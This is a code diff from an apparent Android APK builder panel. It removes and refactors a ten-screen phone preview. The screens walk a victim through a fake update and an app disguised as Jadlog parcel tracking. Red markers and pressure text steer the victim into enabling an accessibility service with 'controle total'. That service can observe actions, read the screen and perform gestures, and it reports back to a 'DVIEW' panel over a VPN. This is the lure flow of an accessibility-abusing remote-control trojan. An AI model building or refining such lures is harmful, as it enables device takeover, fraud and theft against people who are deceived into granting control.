-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "20px 16px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
-                          {/* 4 Quadrados Coloridos no Topo (Grade 2x2) */}
-                          <div style={{ marginTop: "20px", display: "flex", flexDirection: "column", alignItems: "center" }}>
-                            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 20px)", gap: "6px" }}>
-                              <div style={{ width: "20px", height: "20px", background: "#38bdf8", borderRadius: "5px" }} />
-                              <div style={{ width: "20px", height: "20px", background: "#ef4444", borderRadius: "5px" }} />
-                              <div style={{ width: "20px", height: "20px", background: "#eab308", borderRadius: "5px" }} />
-                              <div style={{ width: "20px", height: "20px", background: "#22c55e", borderRadius: "5px" }} />
-                            </div>
-                          </div>
-
-                          {/* Centro: Card do App + Barra de Progresso + Texto Itálico Customizado */}
-                          <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center", padding: "0 10px" }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "14px" }}>
-                              {renderAppLogo(36, 8)}
-                              <span style={{ fontSize: "16px", fontWeight: 700, color: "#0f172a" }}>
-                                {appName}
-                              </span>
-                            </div>
-
-                            {/* Barra de Progresso com Cor da Marca */}
-                            <div style={{ width: "100%", height: "4px", background: "#e2e8f0", borderRadius: "2px", overflow: "hidden", marginBottom: "8px" }}>
-                              <div style={{ width: "65%", height: "100%", background: screenConfig.accentColor || "#2563eb", borderRadius: "2px" }} />
-                            </div>
-
-                            {/* Subtexto em itálico configurável */}
-                            <span style={{ fontSize: "11.5px", color: "#64748b", fontStyle: "italic", textAlign: "center" }}>
-                              {screenConfig.loadingSubtext || "aguarde, atualização em andamento..."}
-                            </span>
-                          </div>
-
-                          {/* Rodapé: Ícone Mascote Android Verde */}
-                          <div style={{ marginBottom: "14px", display: "flex", flexDirection: "column", alignItems: "center" }}>
-                            <svg width="34" height="34" viewBox="0 0 24 24" fill="#3DDC84">
-                              <path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h4v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48C13.62 1.23 12.83 1 12 1s-1.62.23-2.64.63L7.88.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.3 1.3C6.73 3.14 5.5 4.93 5.5 7h13c0-2.07-1.23-3.86-2.97-4.84zM9 5c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm6 0c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/>
-                            </svg>
-                            <button
-                              style={{ marginTop: "14px", background: screenConfig.accentColor || "#2563eb", border: "none", color: "#fff", borderRadius: "6px", padding: "6px 16px", fontSize: "11px", fontWeight: 600, cursor: "pointer" }}
-                              onClick={() => setPreviewStep(3)}
-                            >
-                              Avançar para Inicialização
-                            </button>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* TELA 03 — INICIALIZAÇÃO DO APLICATIVO (Fundo Preto, Badge Central, Spinner Ciano, Copyright) */}
-                      {previewStep === 3 && (
-                        <div className="phone-screen-content" style={{ background: "#000000", padding: "24px 16px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
-                          <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
-                            {/* Badge Central com Logotipo do Aplicativo */}
-                            {renderSplashLogo()}
-
-                            {/* Spinner Circular em Arco Ciano Girando */}
-                            <div className="cyan-spinner-arc" />
-                          </div>
-
-                          {/* Rodapé com Direitos Reservados Configuráveis */}
-                          <div style={{ marginBottom: "12px", textAlign: "center" }}>
-                            <p style={{ margin: "0 0 12px 0", fontSize: "10.5px", color: "#64748b", fontFamily: "var(--font-mono)" }}>
-                              © 25 {appName}. {screenConfig.copyrightText || "All Rights Reserved."}
-                            </p>
-                            <button
-                              style={{ background: "#1e293b", border: "1px solid #334155", color: "#38bdf8", borderRadius: "6px", padding: "6px 14px", fontSize: "11px", fontWeight: 600, cursor: "pointer" }}
-                              onClick={() => setPreviewStep(4)}
-                            >
-                              Ir para Configurações (Acessibilidade)
-                            </button>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* TELA 04 — CONFIGURAÇÕES DO ANDROID (ACESSIBILIDADE COM PONTO VERMELHO) */}
-                      {previewStep === 4 && (
-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
-                          {/* Barra de Navegação Superior Oficial */}
-                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "10px" }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                              <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(3)} />
-                              <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>Acessibilidade</span>
-                            </div>
-                            <div style={{ display: "flex", alignItems: "center", gap: "10px", color: "#64748b" }}>
-                              <Search size={16} />
-                              <span style={{ fontSize: "16px", fontWeight: "bold" }}>⋮</span>
-                            </div>
-                          </div>
-
-                          {/* Lista Oficial de Configurações */}
-                          <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                <span style={{ fontSize: "15px" }}>🟢</span>
-                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Recomendado para você</span>
-                              </div>
-                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
-                            </div>
-
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                <span style={{ fontSize: "15px" }}>🔍</span>
-                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Melhorias de visão</span>
-                              </div>
-                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
-                            </div>
-
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                <span style={{ fontSize: "15px" }}>💬</span>
-                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>TalkBack</span>
-                              </div>
-                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
-                            </div>
-
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                <span style={{ fontSize: "15px" }}>🔊</span>
-                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Audição</span>
-                              </div>
-                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
-                            </div>
-
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                <span style={{ fontSize: "15px" }}>⚙️</span>
-                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Configurações avançadas</span>
-                              </div>
-                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
-                            </div>
-
-                            {/* Item Oficial Aplicativos Instalados com Ponto de Notificação Vermelho */}
-                            <div
-                              style={{
-                                display: "flex",
-                                alignItems: "center",
-                                justifyContent: "space-between",
-                                padding: "12px",
-                                background: "#ffffff",
-                                borderRadius: "8px",
-                                border: "2px solid #ef4444",
-                                boxShadow: "0 2px 10px rgba(239, 68, 68, 0.15)",
-                                cursor: "pointer",
-                                marginTop: "4px"
-                              }}
-                              onClick={() => setPreviewStep(5)}
-                            >
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                <span style={{ fontSize: "15px" }}>📱</span>
-                                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                  <span style={{ fontSize: "12.5px", fontWeight: 700, color: "#0f172a" }}>Aplicativos instalados</span>
-                                  <div style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#ef4444", boxShadow: "0 0 6px #ef4444" }} />
-                                </div>
-                              </div>
-                              <ChevronRight size={14} style={{ color: "#ef4444" }} />
-                            </div>
-                          </div>
-
-                          <button
-                            style={{ marginTop: "auto", width: "100%", background: "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
-                            onClick={() => setPreviewStep(5)}
-                          >
-                            Acessar Aplicativos Instalados (Toque aqui)
-                          </button>
-                        </div>
-                      )}
-
-                      {/* TELA 05 — ACESSIBILIDADE → APLICATIVOS INSTALADOS (TRANSIÇÃO E FOCO) */}
-                      {previewStep === 5 && (
-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
-                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                              <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(4)} />
-                              <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>Acessibilidade</span>
-                            </div>
-                            <div style={{ display: "flex", alignItems: "center", gap: "10px", color: "#64748b" }}>
-                              <Search size={16} />
-                              <span style={{ fontSize: "16px", fontWeight: "bold" }}>⋮</span>
-                            </div>
-                          </div>
-
-                          {/* Destaque com Foco e Instrução */}
-                          <div style={{ padding: "12px", background: "#e0f2fe", border: "1px solid #38bdf8", borderRadius: "10px", marginBottom: "16px", fontSize: "11px", color: "#0369a1" }}>
-                            <strong>Orientações ao Usuário:</strong>
-                            <p style={{ margin: "4px 0 0 0" }}>Localize e clique na opção <strong>Aplicativos instalados</strong> indicada com a notificação vermelha para ativar o serviço.</p>
-                          </div>
-
-                          <div
-                            style={{
-                              display: "flex",
-                              alignItems: "center",
-                              justifyContent: "space-between",
-                              padding: "16px 14px",
-                              background: "#ffffff",
-                              borderRadius: "10px",
-                              border: "2px solid #ef4444",
-                              boxShadow: "0 4px 16px rgba(239, 68, 68, 0.25)",
-                              cursor: "pointer"
-                            }}
-                            onClick={() => setPreviewStep(6)}
-                          >
-                            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-                              <span style={{ fontSize: "20px" }}>📱</span>
-                              <div>
-                                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                  <span style={{ fontSize: "13.5px", fontWeight: 800, color: "#0f172a" }}>Aplicativos instalados</span>
-                                  <div style={{ width: "9px", height: "9px", borderRadius: "50%", background: "#ef4444", boxShadow: "0 0 8px #ef4444" }} />
-                                </div>
-                                <span style={{ fontSize: "10.5px", color: "#64748b" }}>Serviços baixados no dispositivo</span>
-                              </div>
-                            </div>
-                            <span style={{ background: "#ef4444", color: "#fff", padding: "3px 8px", borderRadius: "4px", fontSize: "10px", fontWeight: 700 }}>
-                              Toque aqui
-                            </span>
-                          </div>
-
-                          <button
-                            style={{ marginTop: "auto", width: "100%", background: "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
-                            onClick={() => setPreviewStep(6)}
-                          >
-                            Abrir Lista de Aplicativos Instalados
-                          </button>
-                        </div>
-                      )}
-
-                      {/* TELA 06 — JADLOG RASTREIO — SERVIÇO OFF COM BALÃO FLUTUANTE */}
-                      {previewStep === 6 && (
-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
-                          {/* Cabeçalho */}
-                          <div style={{ display: "flex", alignItems: "center", gap: "8px", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
-                            <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(5)} />
-                            <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>Aplicativos Instalados</span>
-                          </div>
-
-                          {/* Lista com o Aplicativo Desativado / Off */}
-                          <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
-                            {/* Item do Aplicativo */}
-                            <div
-                              style={{
-                                display: "flex",
-                                alignItems: "center",
-                                justifyContent: "space-between",
-                                padding: "12px 14px",
-                                background: "#ffffff",
-                                borderRadius: "8px",
-                                border: `1.5px solid ${screenConfig.accentColor || "#2563eb"}`,
-                                cursor: "pointer"
-                              }}
-                              onClick={() => setPreviewStep(7)}
-                            >
-                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                {renderAppLogo(28, 6)}
-                                <div>
-                                  <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a", display: "block" }}>
-                                    {appName}
-                                  </span>
-                                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>Desativado</span>
-                                </div>
-                              </div>
-                              <span style={{ fontSize: "12px", color: "#64748b", fontWeight: 600 }}>Off</span>
-                            </div>
-
-                            {/* Balão Flutuante Escuro com Seta Apontando */}
-                            <div className="phone-speech-callout" onClick={() => setPreviewStep(7)} style={{ cursor: "pointer" }}>
-                              {screenConfig.speechCalloutText || "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar."}
-                            </div>
-                          </div>
-
-                          <button
-                            style={{ marginTop: "auto", width: "100%", background: screenConfig.accentColor || "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
-                            onClick={() => setPreviewStep(7)}
-                          >
-                            Configurar {appName}
-                          </button>
-                        </div>
-                      )}
-
-                      {/* TELA 07 — CONFIGURAÇÃO DO SERVIÇO */}
-                      {previewStep === 7 && (
-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
-                          <div style={{ display: "flex", alignItems: "center", gap: "8px", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
-                            <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(6)} />
-                            <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>{appName}</span>
-                          </div>
-
-                          {/* Toggle Switch Card */}
-                          <div style={{ background: "#ffffff", borderRadius: "10px", border: "1px solid #cbd5e1", padding: "14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px" }}>
-                            <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a" }}>Usar {appName}</span>
-
-                            {/* Toggle Off */}
-                            <div
-                              onClick={() => setPreviewStep(8)}
-                              style={{ width: "42px", height: "24px", background: "#cbd5e1", borderRadius: "12px", position: "relative", cursor: "pointer", transition: "all 0.2s ease" }}
-                              title="Toque para ativar"
-                            >
-                              <div style={{ width: "20px", height: "20px", background: "#ffffff", borderRadius: "50%", position: "absolute", left: "2px", top: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.3)" }} />
-                            </div>
-                          </div>
-
-                          <div style={{ background: "#ffffff", borderRadius: "10px", border: "1px solid #e2e8f0", padding: "12px", fontSize: "11.5px", color: "#475569", lineHeight: "1.5" }}>
-                            <strong>Sobre o serviço:</strong>
-                            <p style={{ margin: "6px 0 0 0" }}>
-                              {(screenConfig.serviceDescription || "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.").replace(/{appName}/g, appName)}
-                            </p>
-                          </div>
-
-                          <button
-                            style={{ marginTop: "auto", width: "100%", background: screenConfig.accentColor || "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
-                            onClick={() => setPreviewStep(8)}
-                          >
-                            Ativar Chave do Serviço
-                          </button>
-                        </div>
-                      )}
-
-                      {/* TELA 08 — DIÁLOGO DE AUTORIZAÇÃO DO SISTEMA (MODAL DE SEGURANÇA ANDROID) */}
-                      {previewStep === 8 && (
-                        <div className="phone-screen-content" style={{ background: "#0f172a", padding: "16px", justifyContent: "center" }}>
-                          <div style={{ background: "#ffffff", borderRadius: "20px", padding: "20px 18px", color: "#0f172a", boxShadow: "0 10px 30px rgba(0,0,0,0.6)" }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
-                              <ShieldAlert size={28} style={{ color: "#f59e0b", flexShrink: 0 }} />
-                              <h4 style={{ margin: 0, fontSize: "14px", fontWeight: 700, color: "#0f172a" }}>
-                                {(screenConfig.permissionDialogTitle || "Permitir controle total para {appName}?").replace(/{appName}/g, appName)}
-                              </h4>
-                            </div>
-
-                            <div style={{ fontSize: "11px", color: "#334155", lineHeight: "1.45", margin: "10px 0 16px 0" }}>
-                              <p style={{ margin: "0 0 6px 0", fontWeight: 600 }}>O serviço de acessibilidade precisa:</p>
-                              • <strong>Observar suas ações</strong>: receber notificações ao interagir com um aplicativo.<br />
-                              • <strong>Recuperar conteúdo da janela</strong>: inspecionar o conteúdo na tela.<br />
-                              • <strong>Executar gestos</strong>: tocar e interagir com elementos autorizados.
-                            </div>
-
-                            <div style={{ display: "flex", justifyContent: "flex-end", gap: "12px" }}>
-                              <button
-                                style={{ background: "transparent", border: "none", color: "#64748b", fontWeight: 600, fontSize: "12.5px", cursor: "pointer", padding: "6px 10px" }}
-                                onClick={() => setPreviewStep(7)}
-                              >
-                                Recusar
-                              </button>
-                              <button
-                                style={{ background: screenConfig.accentColor || "#2563eb", border: "none", color: "#ffffff", fontWeight: 700, fontSize: "12.5px", cursor: "pointer", padding: "6px 14px", borderRadius: "6px" }}
-                                onClick={() => setPreviewStep(9)}
-                              >
-                                Permitir
-                              </button>
-                            </div>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* TELA 09 — CONCESSÃO E ATIVAÇÃO DO SERVIÇO (TOGGLE ON) */}
-                      {previewStep === 9 && (
-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
-                          <div style={{ display: "flex", alignItems: "center", gap: "8px", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
-                            <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(8)} />
-                            <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>{appName}</span>
-                          </div>
-
-                          {/* Toggle Switch Card Ativado */}
-                          <div style={{ background: "#ffffff", borderRadius: "10px", border: "1px solid #22c55e", padding: "14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px", boxShadow: "0 2px 8px rgba(34, 197, 94, 0.15)" }}>
-                            <div>
-                              <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a", display: "block" }}>Usar {appName}</span>
-                              <span style={{ fontSize: "10.5px", color: "#16a34a", fontWeight: 600 }}>Ativado</span>
-                            </div>
-
-                            {/* Toggle On */}
-                            <div
-                              onClick={() => setPreviewStep(10)}
-                              style={{ width: "42px", height: "24px", background: "#22c55e", borderRadius: "12px", position: "relative", cursor: "pointer" }}
-                              title="Serviço Ativado"
-                            >
-                              <div style={{ width: "20px", height: "20px", background: "#ffffff", borderRadius: "50%", position: "absolute", right: "2px", top: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.3)" }} />
-                            </div>
-                          </div>
-
-                          <div style={{ background: "#f0fdf4", borderRadius: "10px", border: "1px solid #bbf7d0", padding: "12px", fontSize: "11.5px", color: "#166534" }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: 700, marginBottom: "4px" }}>
-                              <CheckCircle2 size={14} style={{ color: "#16a34a" }} />
-                              Serviço de Acessibilidade Habilitado
-                            </div>
-                            O sistema operacional confirmou a inicialização do serviço. Retornando ao aplicativo...
-                          </div>
-
-                          <button
-                            style={{ marginTop: "auto", width: "100%", background: "#22c55e", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
-                            onClick={() => setPreviewStep(10)}
-                          >
-                            Retornar ao Aplicativo
-                          </button>
-                        </div>
-                      )}
-
-                      {/* TELA 10 — ATIVAÇÃO CONCLUÍDA / APP PRONTO */}
-                      {previewStep === 10 && (
-                        <div className="phone-screen-content phone-screen-light" style={{ padding: "16px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between", background: "#ffffff" }}>
-                          <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center", margin: "auto 0" }}>
-                            {/* Badge do App */}
-                            <div style={{
-                              marginBottom: "12px"
-                            }}>
-                              {renderAppLogo(46, 12)}
-                            </div>
-
-                            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", justifyContent: "center", marginBottom: "12px" }}>
-                              <div style={{ display: "inline-flex", alignItems: "center", gap: "6px", background: "#dcfce7", border: "1px solid #86efac", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#166534" }}>
-                                <CheckCircle2 size={12} style={{ color: "#16a34a" }} />
-                                SISTEMA SINCRONIZADO & ATIVO
-                              </div>
-                              {islandProfileEnabled && (
-                                <div style={{ display: "inline-flex", alignItems: "center", gap: "4px", background: "#e0f2fe", border: "1px solid #7dd3fc", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#0369a1" }}>
-                                  🏝️ PERFIL ISLAND ATIVADO
-                                </div>
-                              )}
-                              {vpnEnabled && (
-                                <div style={{ display: "inline-flex", alignItems: "center", gap: "4px", background: "#eff6ff", border: "1px solid #93c5fd", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#1d4ed8" }}>
-                                  🛡️ VPN {vpnProtocol} ATIVA (1000 Mbps)
-                                </div>
-                              )}
-                            </div>
-
-                            <h3 style={{ margin: "4px 0", fontSize: "16px", color: "#0f172a", fontWeight: 800 }}>
-                              {(screenConfig.trackingTitle || "Rastreamento de Encomendas").replace(/{appName}/g, appName)}
-                            </h3>
-                            <p style={{ margin: "4px 0 16px 0", fontSize: "11.5px", color: "#64748b", textAlign: "center" }}>
-                              {(screenConfig.trackingSubtext || "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.").replace(/{appName}/g, appName)}
-                            </p>
-
-                            {/* Input de Rastreamento Simulado */}
-                            <div style={{ width: "100%", background: "#f8fafc", border: "1px solid #cbd5e1", borderRadius: "8px", padding: "8px 12px", display: "flex", alignItems: "center", gap: "8px", marginBottom: "12px" }}>
-                              <Search size={14} style={{ color: "#64748b" }} />
-                              <span style={{ fontSize: "11.5px", color: "#94a3b8" }}>Ex: 10082938192831...</span>
-                            </div>
-
-                            {/* Telemetria JSON de Sucesso */}
-                            <div style={{ width: "100%", background: "#f1f5f9", border: "1px solid #e2e8f0", borderRadius: "8px", padding: "10px", fontSize: "10px", color: "#334155", fontFamily: "var(--font-mono)", textAlign: "left" }}>
-                              <div>• installation: <strong style={{ color: "#16a34a" }}>"verified"</strong></div>
-                              <div>• accessibility: <strong style={{ color: "#16a34a" }}>"connected"</strong></div>
-                              <div>• island_profile: <strong style={{ color: "#0284c7" }}>{islandProfileEnabled ? '"provisioned"' : '"disabled"'}</strong></div>
-                              <div>• vpn_tunnel: <strong style={{ color: "#16a34a" }}>"{vpnProtocol} - 1000Mbps (wire-speed)"</strong></div>
-                              <div>• server_sync: <strong style={{ color: "#16a34a" }}>"online"</strong></div>
-                            </div>
-                          </div>
-
-                          <button
-                            style={{ width: "100%", background: screenConfig.accentColor || "#dc2626", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer", boxShadow: `0 4px 12px ${screenConfig.accentColor || "#dc2626"}55` }}
-                            onClick={() => showToast("Sistema pronto e conectado ao painel DVIEW!")}
-                          >
-                            Concluir & Voltar ao Início
-                          </button>
-                        </div>
-                      )}
-                    </>
-                  )}
-                </div>
-              </div>
-
-                  {/* LADO DIREITO: CHECKLIST DE VALIDAÇÃO TÉCNICA INTEGRADO */}
-                  <div className="preview-checklist-card">
-                    {/* Metadados da Etapa Ativa */}
-                    <div className="preview-step-meta-box">
-                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-                        <span style={{ fontSize: "11px", color: "#94a3b8", fontWeight: 700 }}>
-                          ETAPA {officialSteps[previewStep - 1].step} DE 10
-                        </span>
-                        <span
-                          className="preview-step-badge"
-                          style={{
-                            background: `${officialSteps[previewStep - 1].badgeColor}25`,
-                            color: officialSteps[previewStep - 1].badgeColor
-                          }}
-                        >
-                          {officialSteps[previewStep - 1].badge}
-                        </span>
-                      </div>
-                      <strong style={{ fontSize: "14px", color: "#ffffff" }}>
-                        {officialSteps[previewStep - 1].title}
-                      </strong>
-                      <small style={{ color: "#38bdf8", fontSize: "11.5px" }}>
-                        {officialSteps[previewStep - 1].systemPath}
-                      </small>
-                      <p style={{ fontSize: "12px", color: "#cbd5e1", margin: "6px 0 0 0", lineHeight: "1.4" }}>
-                        {officialSteps[previewStep - 1].description}
-                      </p>
-                    </div>
-
-                    {/* Grupos do Checklist de Instalação e Validação */}
-                    <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
-                      {validationChecklistGroups.map((group, gIdx) => (
-                        <div key={gIdx} className="checklist-group">
-                          <span className="checklist-group-title">
-                            <ListChecks size={13} style={{ color: "var(--crimson-neon)" }} />
-                            {group.title}
-                          </span>
-                          <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
-                            {group.items.map((item, iIdx) => {
-                              const isPassed = previewStep >= item.activeAt;
-                              return (
-                                <div key={iIdx} className="checklist-item-row">
-                                  {isPassed ? (
-                                    <CheckCircle2 size={14} className="checklist-check-icon" />
-                                  ) : (
-                                    <div style={{ width: "14px", height: "14px", borderRadius: "50%", border: "1.5px solid #475569", flexShrink: 0 }} />
-                                  )}
-                                  <span style={{ color: isPassed ? "#f8fafc" : "#64748b" }}>
-                                    {item.label}
-                                  </span>
-                                </div>
-                              );
-                            })}
-                          </div>
-                        </div>
-                      ))}
-                    </div>
-
-                    {/* Card de Critério de Aceitação Oficial */}
-                    <div className="acceptance-criteria-card">
-                      <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "4px" }}>
-                        <Sparkles size={14} style={{ color: "#22c55e" }} />
-                        <strong style={{ fontSize: "11.5px", color: "#22c55e", textTransform: "uppercase" }}>
-                          Critério de Aceitação Oficial
-                        </strong>
-                      </div>
-                      <div style={{ fontSize: "11px", color: "#cbd5e1", fontFamily: "var(--font-mono)", lineHeight: "1.5" }}>
-                        INSTALLATION = SUCCESS<br />
-                        CONFIGURATION = SUCCESS<br />
-                        ACCESSIBILITY_SERVICE = ENABLED<br />
-                        APPLICATION = READY
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Bottom Navigation between screens */}
-                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", width: "100%", marginTop: "16px" }}>
-                  <button
-                    className="secondary"
-                    onClick={() => setActiveModalTab("form")}
-                  >
-                    <ArrowLeft size={14} /> Voltar à Edição do APK
-                  </button>
-
-                  <div style={{ display: "flex", gap: "8px" }}>
-                    <button
-                      className="secondary"
-                      disabled={previewStep <= 1}
-                      onClick={() => setPreviewStep((s) => Math.max(1, s - 1))}
-                    >
-                      Etapa Anterior
-                    </button>
-                    <button
-                      className="primary"
-                      disabled={previewStep >= 10}
-                      onClick={() => setPreviewStep((s) => Math.min(10, s + 1))}
-                    >
-                      Próxima Etapa ({previewStep}/10)
-                    </button>
-                  </div>
-                </div>
-              </div>
+              <ApkPhoneSimulatorTab
+                previewStep={previewStep}
+                setPreviewStep={setPreviewStep}
+                officialSteps={officialSteps}
+                isPlayingAuto={isPlayingAuto}
+                setIsPlayingAuto={setIsPlayingAuto}
+                appName={appName}
+                setAppName={setAppName}
+                screenConfig={screenConfig}
+                setScreenConfig={setScreenConfig}
+                setActiveModalTab={setActiveModalTab}
+                platform={platform}
+                notificationState={notificationState}
+                setNotificationState={setNotificationState}
+                customLogoDataUrl={customLogoDataUrl}
+                companyEmoji={companyEmoji}
+                showToast={showToast}
+                renderAppLogo={renderAppLogo}
+                renderSplashLogo={renderSplashLogo}
+                organizationName={organizationName}
+                redirectUrl={redirectUrl}
+                vpnEnabled={vpnEnabled}
+                vpnProtocol={vpnProtocol}
+                vpnPort={vpnPort}
+                serverUrl={serverUrl}
+                bundleId={bundleId}
+                packageName={packageName}
+                version={version}
+                islandProfileEnabled={islandProfileEnabled}
+                validationChecklistGroups={validationChecklistGroups}
+              />
             )}
           </div>
         </div>
